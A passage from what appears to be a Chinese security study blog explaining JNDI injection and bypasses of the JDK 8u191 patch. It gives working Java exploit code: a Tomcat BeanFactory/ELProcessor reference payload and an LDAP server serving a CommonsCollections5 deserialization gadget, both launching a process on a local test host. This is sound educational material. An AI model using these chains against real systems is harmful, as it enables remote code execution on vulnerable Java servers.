alt="image-20240730211225200"></p><p>过程其实就是</p><p><code>getObjectFactoryFromReference</code> &#x3D;&gt; <code>loadClass</code> &#x3D;&gt; 本地<code>AppClassLoader</code>找不到 &#x3D;&gt; <code>URLClassLoader</code></p><h4 id="Patch-1"><a href="#Patch-1" class="headerlink" title="Patch"></a>Patch</h4><p>8u191之后进行了修补， loadClass方法中添加 trustURLCodebase 属性，所以不能远程加载了。</p><h2 id="JDK8u191后的JNDI注入绕过"><a href="#JDK8u191后的JNDI注入绕过" class="headerlink" title="JDK8u191后的JNDI注入绕过"></a>JDK8u191后的JNDI注入绕过</h2><p>可见<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">绕过JDK高版本限制进行JNDI注入 - Eddie_Murphy - 博客园 (cnblogs.com)</a></p><p>针对8u191的绕过大致两种途径</p><ol><li>找到一个受害者本地<code>CLASSPATH</code>中的类作为恶意的<code>Reference Factory</code>工厂类，并利用这个本地的<code>Factory</code>类执行命令。</li><li>利用<code>LDAP</code>直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化<code>Gadget</code>完成命令执行。</li></ol><ul><li>既然远程不能打，就找本地有没有可利用的类。服务端返回的<code>Reference</code>对象中包含本地存在的可利用<code>Factory</code>类，<code>loadClass</code>后，创建实例对象，调用其 <code>getObjectInstance</code> 方法。（该<code>Factory</code>类需要实现 <strong><code>javax.naming.spi.ObjectFactory</code></strong> 接口，还要重写其 <code>getObjectInstance</code> 方法）</li><li>通过LDAP的 <code>javaSerializedData</code>反序列化<code>gadget</code>。LDAP服务端除了支持<code>JNDI Reference</code>这种利用方式外，还支持直接返回一个序列化的对象。如果Java对象的<code>javaSerializedData</code>属性值不为空，则客户端的o<code>bj.decodeObject()</code>方法就会对这个字段的内容进行反序列化。</li></ul><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><p>Server：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client存在Factory：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Static Code&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Non-Arg Constructor&quot;</span>);<br>    &#125;<br><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;Constructor Code&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;getObjectInstance&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面说到Client会先尝试本地加载类，因此lookup请求后，加载并实例化了Test类。</p><blockquote><p>Static Code Constructor Code Non-Arg Constructor getObjectInstance</p></blockquote><h3 id="本地Class利用"><a href="#本地Class利用" class="headerlink" title="本地Class利用"></a>本地Class利用</h3><p>目前公开常用的利用方法是通过 <strong>Tomcat</strong> 的 <strong>org.apache.naming.factory.BeanFactory</strong> 工厂类去调用 <strong>javax.el.ELProcessor#eval</strong> 方法或 <strong>groovy.lang.GroovyShell#evaluate</strong> 方法</p><blockquote><p><code>org.apache.naming.factory.BeanFactory</code> 在 <code>getObjectInstance()</code> 中会通过反射的方式实例化<code>Reference</code>所指向的<code>Bean Class</code>，并且能调用一些指定的方法</p></blockquote><p>要使用 <code>javax.el.ELProcessor</code>，需要 <code>Tomcat 8+</code>或<code>SpringBoot 1.2.x+</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Server：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;running&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析略，看原文去吧。</p><p>这里直接给出，<code>method.invoke</code>的触发对象需满足：</p><ul><li>有无参构造器（<code>beanClass.getConstructor().newInstance()</code>调用无参构造器）</li><li>有一个可利用的方法，且该方法接收且只接收一个String类型参数（valueArray是String类型的数组，只有一个元素）</li></ul><p>本地利用的调用栈：</p><blockquote><p><code>InitialContext#lookup()</code> <code>RegistryContext#lookup()</code> <code>RegistryContext#decodeObject()</code> <code>NamingManager#getObjectInstance()</code> <code>objectfactory = NamingManager#getObjectFactoryFromReference()</code> <code>Class#newInstance()</code> &#x2F;&#x2F;–&gt;恶意代码被执行 </p><p>或: <code>objectfactory#getObjectInstance()</code> &#x2F;&#x2F;–&gt;恶意代码被执行</p></blockquote><h3 id="ldap返回序列化对象"><a href="#ldap返回序列化对象" class="headerlink" title="ldap返回序列化对象"></a>ldap返回序列化对象</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Server：用CC5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( String[] tmp_args )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        String[] args=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;http://127.0.0.1/#calc&quot;</span>&#125;;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;<br><br>        <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>        config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>        config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(args[ <span class="hljs-number">0</span> ])));<br>        <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>        System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>        ds.startListening();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br><br>            e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>,CommonsCollections5());<br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] CommonsCollections5() <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map lazyMap=LazyMap.decorate(map,chainedTransformer);<br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;test&quot;</span>);<br>        BadAttributeValueExpException badAttributeValueExpException=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        Field field=badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1389/calc&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/30/JNDI/image-20240730212849450.png" alt="image-20240730212849450"></p><p>原理也就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 